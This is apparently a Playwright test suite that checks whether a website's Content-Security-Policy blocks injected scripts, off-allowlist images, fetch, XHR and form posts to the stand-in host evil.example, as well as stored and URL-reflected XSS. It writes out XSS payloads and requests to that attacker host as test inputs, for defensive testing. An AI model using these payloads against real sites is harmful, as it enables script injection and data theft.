// Proves the CSP BLOCKS attacks, rather than merely permitting legitimate traffic.
// Every check here is an attack that must fail.
//
// Each blocked-origin check is made real: the attacker's host is routed to a 200 with a working payload, so
// nothing but the Content-Security-Policy can stop it, and the check asserts the securitypolicyviolation the
// policy raises. A control run of the same payload in a context that bypasses the CSP must succeed, or the
// route proves nothing. The pages are served as shipped (armGa with its policy rewrite switched off); only the
// Measurement ID is replaced, so the consent module is live and the Google allowances can be tried.
//
// Framing/clickjacking is deliberately absent: `frame-ancestors` cannot be
// expressed in a meta CSP at all, so it is an edge-layer control and is
// asserted by headers.js instead. Two of the checks below (storage
// poisoning and URL reflection) pass because app.js has no reflective sink,
// not because the CSP blocks them — they guard against a future regression.
const { BASE, ALL_THEMES, TEST_ID, GTAG_SCRIPT, armGa, launch } = require('./_common');

// A 1x1 transparent PNG, so an image from the attacker's host is a real image if it is ever allowed through.
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');

// Routes the attacker's hosts to working payloads, on top of armGa (the most recent route runs first).
async function routeAttacker(ctx) {
  await ctx.route('https://evil.example/**', (route) => {
    const u = new URL(route.request().url());
    if (u.pathname.endsWith('.js')) return route.fulfill({ status: 200, contentType: 'text/javascript', body: 'window.__evil = true;' });
    if (u.pathname.endsWith('.png')) return route.fulfill({ status: 200, contentType: 'image/png', body: PNG });
    return route.fulfill({ status: 200, contentType: 'text/plain', headers: { 'access-control-allow-origin': '*' }, body: 'ok' });
  });
  // Tag Manager's container loader and a Google host the policy does not name: both answer 200, so only the policy can refuse them.
  await ctx.route('https://www.googletagmanager.com/gtm.js**', (route) =>
    route.fulfill({ status: 200, contentType: 'text/javascript', body: 'window.__gtm = true;' }));
  await ctx.route('https://www.googletagmanager.com/a**', (route) => route.fulfill({ status: 200, contentType: 'text/plain', body: 'ok' }));
  await ctx.route('https://www.google.com/**', (route) => route.fulfill({ status: 200, contentType: 'text/plain', headers: { 'access-control-allow-origin': '*' }, body: 'ok' }));
  await ctx.route('https://stats.g.doubleclick.net/**', (route) => route.fulfill({ status: 200, contentType: 'text/plain', headers: { 'access-control-allow-origin': '*' }, body: 'ok' }));
}

(async () => {
  const browser = await launch();
  const results = [];
  const record = (name, passed, detail) =>
    results.push(`${passed ? 'PASS' : 'FAIL'}  ${name}${detail ? '  — ' + detail : ''}`);

  const make = async (bypassCSP) => {
    const ctx = await browser.newContext({ bypassCSP });
    const ga = await armGa(ctx, { csp: 'asis', footer: false });
    await routeAttacker(ctx);
    const page = await ctx.newPage();
    await page.addInitScript(() => {
      window.__v = [];
      document.addEventListener('securitypolicyviolation',
        (e) => window.__v.push(`${e.effectiveDirective} blocked ${e.blockedURI || 'inline'}`));
    });
    await page.goto(BASE + 'index.html', { waitUntil: 'domcontentloaded' });
    return { ctx, ga, page };
  };
  const { page, ga } = await make(false);
  const control = await make(true);
  const violations = (pg) => pg.evaluate(() => window.__v.slice());
  const mentions = (list, directive, host) => list.some((v) => v.startsWith(directive) && v.includes(host));

  // 1. Injected inline <script> must not execute.
  const inlineRan = await page.evaluate(() => {
    window.__pwned = false;
    try {
      const s = document.createElement('script');
      s.textContent = 'window.__pwned = true';
      document.body.appendChild(s);
    } catch (e) { /* blocked */ }
    return window.__pwned;
  });
  record('CSP blocks injected inline <script>', inlineRan === false, `executed=${inlineRan}`);

  // 2. External script from a non-allowed host must not load. The host answers 200 with a working script, so
  //    only the policy stops it; the same script loads when the policy is bypassed.
  const loadScript = (url) => new Promise((res) => {
    const s = document.createElement('script');
    s.src = url;
    s.onload = () => res('LOADED');
    s.onerror = () => res('blocked');
    document.body.appendChild(s);
    setTimeout(() => res('timeout'), 1500);
  });
  const ext = await page.evaluate(loadScript, 'https://evil.example/x.js');
  const extControl = await control.page.evaluate(loadScript, 'https://evil.example/x.js');
  const v2 = await violations(page);
  record('CSP blocks external script', ext !== 'LOADED' && !(await page.evaluate(() => window.__evil)) && mentions(v2, 'script-src', 'evil.example'),
    `result=${ext}, violation=${v2.filter((v) => /evil/.test(v)).join(';') || 'none'}`);
  record('negative control is real: the same script loads when the CSP is bypassed', extControl === 'LOADED', `result=${extControl}`);

  // 3. Image from a non-allow-listed host must not load.
  const loadImage = (url) => new Promise((res) => {
    const i = new Image();
    i.onload = () => res('LOADED');
    i.onerror = () => res('blocked');
    i.src = url;
    setTimeout(() => res('timeout'), 1500);
  });
  const img = await page.evaluate(loadImage, 'https://evil.example/x.png');
  const imgControl = await control.page.evaluate(loadImage, 'https://evil.example/x.png');
  const v3 = await violations(page);
  record('CSP blocks off-allowlist image', img !== 'LOADED' && mentions(v3, 'img-src', 'evil.example'), `result=${img}, violation=${v3.filter((v) => /img-src/.test(v)).join(';') || 'none'}`);
  record('negative control is real: the same image loads when the CSP is bypassed', imgControl === 'LOADED', `result=${imgControl}`);

  // 4. Inline event handler must not fire (script-src has no 'unsafe-inline').
  const handlerRan = await page.evaluate(() => {
    window.__click = false;
    const b = document.createElement('button');
    b.setAttribute('onclick', 'window.__click = true');
    document.body.appendChild(b);
    b.click();
    return window.__click;
  });
  record('CSP blocks inline event handler', handlerRan === false, `ran=${handlerRan}`);

  // 5. Injected inline STYLE — only blocked once style-src drops 'unsafe-inline'.
  const styleApplied = await page.evaluate(() => {
    const d = document.createElement('div');
    d.id = '__probe';
    document.body.appendChild(d);
    const st = document.createElement('style');
    st.textContent = '#__probe { position: fixed; }';
    document.head.appendChild(st);
    return getComputedStyle(d).position === 'fixed';
  });
  record('CSP blocks injected inline <style>', styleApplied === false,
    styleApplied ? "style-src still allows 'unsafe-inline'" : 'strict style-src active');

  // 6. A request to an attacker's host must not leave the page: fetch, XHR and a form target (connect-src, form-action).
  const connect = async (url) => {
    try { await fetch(url, { mode: 'no-cors' }); return 'SENT'; } catch (e) { return 'blocked'; }
  };
  const fetchEvil = await page.evaluate(connect, 'https://evil.example/c');
  const fetchControl = await control.page.evaluate(connect, 'https://evil.example/c');
  const v6 = await violations(page);
  record('CSP blocks a fetch to an attacker\'s host (connect-src)', fetchEvil === 'blocked' && mentions(v6, 'connect-src', 'evil.example'),
    `result=${fetchEvil}, violation=${v6.filter((v) => /connect-src/.test(v) && /evil/.test(v)).join(';') || 'none'}`);
  record('negative control is real: the same fetch is sent when the CSP is bypassed', fetchControl === 'SENT', `result=${fetchControl}`);
  const xhr = await page.evaluate(() => new Promise((res) => {
    const x = new XMLHttpRequest();
    x.open('GET', 'https://evil.example/x');
    x.onload = () => res('SENT');
    x.onerror = () => res('blocked');
    x.send();
    setTimeout(() => res('timeout'), 1500);
  }));
  record('CSP blocks an XMLHttpRequest to an attacker\'s host', xhr !== 'SENT', `result=${xhr}`);
  const formHit = await page.evaluate(() => {
    window.__vf = [];
    const f = document.createElement('form');
    f.action = 'https://evil.example/post';
    f.method = 'post';
    document.body.appendChild(f);
    try { f.submit(); } catch (e) { return 'threw'; }
    return 'submitted';
  });
  await page.waitForTimeout(300);
  const v6b = await violations(page);
  record('CSP blocks a form posting to an attacker\'s host (form-action)', mentions(v6b, 'form-action', 'evil.example'), `${formHit}, violation=${v6b.filter((v) => /form-action/.test(v)).join(';') || 'none'}`);
  await page.goto(BASE + 'index.html', { waitUntil: 'domcontentloaded' });        // the submit above navigated away from the page under test

  // 7. Google: exactly the allowed hosts are reachable from connect-src, and nothing near them is.
  const reach = await page.evaluate(async () => {
    const tryFetch = async (u) => { try { await fetch(u, { mode: 'no-cors', method: 'POST' }); return 'sent'; } catch (e) { return 'blocked'; } };
    return {
      collect: await tryFetch('https://www.google-analytics.com/g/collect'),
      region: await tryFetch('https://region1.google-analytics.com/g/collect'),
      analytics: await tryFetch('https://region1.analytics.google.com/g/collect'),
      tagmanager: await tryFetch('https://www.googletagmanager.com/a'),
      google: await tryFetch('https://www.google.com/ping'),
      doubleclick: await tryFetch('https://stats.g.doubleclick.net/j/collect'),
    };
  });
  record('connect-src lets the three Google analytics hosts through (the hits can leave)', reach.collect === 'sent' && reach.region === 'sent' && reach.analytics === 'sent' && reach.tagmanager === 'sent', JSON.stringify(reach));
  record('connect-src refuses google.com and doubleclick (no wildcard over Google)', reach.google === 'blocked' && reach.doubleclick === 'blocked', JSON.stringify({ google: reach.google, doubleclick: reach.doubleclick }));

  // 8. Tag Manager's container loader must stay blocked; only the one gtag path may load. Both answer 200.
  const gtm = await page.evaluate(loadScript, 'https://www.googletagmanager.com/gtm.js?id=GTM-X');
  const gtag = await page.evaluate(loadScript, `${GTAG_SCRIPT}?id=${TEST_ID}`);
  const gtmControl = await control.page.evaluate(loadScript, 'https://www.googletagmanager.com/gtm.js?id=GTM-X');
  const v8 = await violations(page);
  record('script-src pinned to /gtag/js BLOCKS Tag Manager\'s gtm.js (https://www.googletagmanager.com/gtm.js?id=GTM-X)',
    gtm !== 'LOADED' && !(await page.evaluate(() => window.__gtm)) && v8.some((v) => v.startsWith('script-src') && v.includes('gtm.js')),
    `result=${gtm}, violation=${v8.filter((v) => /gtm\.js/.test(v)).join(';') || 'none'}`);
  record('negative control is real: gtm.js loads when the CSP is bypassed', gtmControl === 'LOADED', `result=${gtmControl}`);
  record('script-src lets the one pinned /gtag/js path through', gtag === 'LOADED', `result=${gtag}, violations=${v8.filter((v) => /gtag/.test(v)).join(';') || 'none'}`);

  // 9. Poisoned stored values (the light/dark choice, the drawn colour scheme and the consent answer)
  //    must be rejected, not reflected into the DOM. The consent module is live here, so a bar proves the page really ran it.
  await page.evaluate(() => {
    localStorage.setItem('vynatix-theme', '"><img src=x onerror=window.__xss=1>');
    sessionStorage.setItem('vynatix-look', '"><img src=x onerror=window.__xss=2>');
    localStorage.setItem('vynatix-consent', '"><img src=x onerror=window.__xss=3>');
  });
  const before = ga.google().length;
  await page.reload({ waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(400);
  const poison = await page.evaluate(() => ({
    theme: document.documentElement.getAttribute('data-theme'),
    look: sessionStorage.getItem('vynatix-look'),
    xss: window.__xss || false,
    node: !!document.querySelector('img[src="x"]'),
    bar: !!document.getElementById('consent-bar'),
  }));
  record('storage poisoning rejected',
    ALL_THEMES.includes(poison.theme) && ['forest', 'teal', 'mono'].includes(poison.look) && !poison.xss && !poison.node
      && poison.bar && ga.google().length === before,
    JSON.stringify(poison) + `, google requests ${ga.google().length - before}`);
  await page.evaluate(() => { localStorage.removeItem('vynatix-theme'); sessionStorage.removeItem('vynatix-look'); localStorage.removeItem('vynatix-consent'); });

  // 10. URL fragment/query payloads must never become DOM nodes.
  await page.goto(BASE + 'index.html#"><img src=x onerror=window.__u1=1>', { waitUntil: 'domcontentloaded' });
  const frag = await page.evaluate(() => ({ fired: window.__u1 || false, node: !!document.querySelector('img[src="x"]') }));
  await page.goto(BASE + 'index.html?q=<img src=x onerror=window.__u2=1>', { waitUntil: 'domcontentloaded' });
  const query = await page.evaluate(() => ({ fired: window.__u2 || false, node: !!document.querySelector('img[src="x"]') }));
  record('No reflected XSS via fragment/query',
    !frag.fired && !frag.node && !query.fired && !query.node,
    `frag=${JSON.stringify(frag)} query=${JSON.stringify(query)}`);

  console.log('\n=== adversarial results ===');
  results.forEach((r) => console.log(r));
  const failed = results.filter((r) => r.startsWith('FAIL')).length;
  console.log(failed === 0 ? '\nAll attacks blocked.' : `\n${failed} check(s) not blocked.`);
  await browser.close();
  process.exit(failed === 0 ? 0 : 1);
})().catch((e) => { console.error(e); process.exit(1); });
